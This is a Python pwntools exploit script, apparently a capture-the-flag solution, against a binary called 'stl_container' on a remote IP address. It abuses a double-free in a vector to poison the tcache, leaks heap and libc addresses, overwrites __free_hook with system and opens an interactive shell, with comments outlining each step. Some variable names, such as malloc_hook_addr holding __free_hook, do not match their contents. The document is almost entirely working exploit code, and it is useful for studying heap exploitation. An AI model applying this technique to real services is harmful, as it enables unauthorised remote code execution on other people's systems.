# Vulnerability was basically that vectors do not remove pointers to objects when objects are freed,
# so freeing an object in a vector twice will enable a UAF
from pwn import *
import re

context.terminal = ["guake", "--split-vertical", "-e"]

# one_gadgets = [0x4f2c5,0x4f322,0xe569f,0xe5858,0xe585f,0xe5863,0x10a38c,0x10a398]
# for gadget in one_gadgets:
# env = {"LD_PRELOAD": "./libc-2.27.so"}
# r = process(["./ld-2.27.so", "./stl_container"], env=env)
r = remote('134.175.239.26', 8848)

libc = ELF("./libc-2.27.so")

print(libc.symbols["__malloc_hook"])

def send(v):
    r.sendline(str(v))

def add(ds, val, opt=1):
    if type(val) != bytes:
        val = str(val)
    r.recvuntil(">>")
    r.sendline(str(ds))
    r.recvuntil(">>")
    r.sendline(str(opt))
    print(r.recvuntil(":"))
    r.sendline(val)

def delete(ds, idx=-1, opt=2):
    r.recvuntil(">>")
    r.sendline(str(ds))
    print(r.recvuntil(">>"))
    r.sendline(str(opt))
    if (idx != -1):
        r.recvuntil("?\n")
        r.sendline(str(idx))

def show(ds, idx=-1, opt=3):
    r.recvuntil(">>")
    r.sendline(str(ds))
    r.recvuntil(">>")
    r.sendline(str(opt))
    if (idx != -1):
        r.recvuntil("?\n")
        r.sendline(str(idx))
        return r.recvuntil("STL")
# r.interactive()

# allocate and free several chunks to get unsorted bin chunk with main_arena addr
add(1, "/bin/sh\0")
add(1, "/bin/sh\0")

add(2, "/bin/sh\0")

add(2, "/bin/sh\0")

add(3, "/bin/sh\0")
add(3, "/bin/sh\0")

add(4, "/bin/sh\0")
add(4, "/bin/sh\0")

delete(4)
delete(4)

delete(3)
delete(3)

# delete(2, idx=0)
# delete(2, idx=0)

delete(1, idx=0)
delete(1, idx=0)

delete(2, idx=1)
delete(2, idx=0)

add(2, '0')
add(2, '0')
delete(2, idx=0)
heap_addr = u64(show(2,idx=0)[6:12].ljust(8,b"\x00"))
print(heap_addr)
print(p64(heap_addr))

# show value of vector to get heap address (lowest byte should be 0x70?)
delete(2, idx=0)
# loop in tcache bin, set next pointer to address of chunk with libc address
add(2, p64(heap_addr + 0xa0))

# allocate dummy so next allocate is the libc chunk
add(4, "/bin/sh\x00\x00")

# this one has the libc address
add(1, '')
libc_addr = u64(show(1,idx=0)[6:12].ljust(8,b"\x00"))
print(hex(libc_addr))

libc_start = libc_addr - 4111520 + 150

malloc_hook_addr = libc_start + libc.symbols["__free_hook"]
print(hex(malloc_hook_addr))
one_gadget_addr = libc_start + libc.symbols["system"]
print(hex(one_gadget_addr))

# create loop in tcache bin again, set chunk next to malloc_hook addr
delete(2, idx=0)
add(2, p64(malloc_hook_addr))
add(3, p64(one_gadget_addr))

# add(4,1)
# add(3, p64(malloc_hook_addr))
# add(2, "dummy")
# add(4, p64(one_gadget_addr))

# gdb.attach(r)
r.interactive()

# write 152 bytes to chunk above unsorted bin chunk, then read it to get libc leak
# free all used chunks
# exploit vector erase:
# allocate 2 vectors,
# then any other chunk,
# free the vector chunk at idx 0
# free other chunk
# allocate 2 stack chunks
# free vector chunk at idx 0 again
# check here to make sure chunk alignment is correct
# freed chunk should now be an allocated stack chunk
# free stack chunk to get a loop in tcache
# allocate a new chunk with addr of __malloc_hook at start
# allocate more chunks until next chunk is at __malloc_hook
# allocate new chunk with addr of one_gadget at start (might need offset if there are tcache checks)
# allocate any chunk to trigger __malloc_hook and pop shell
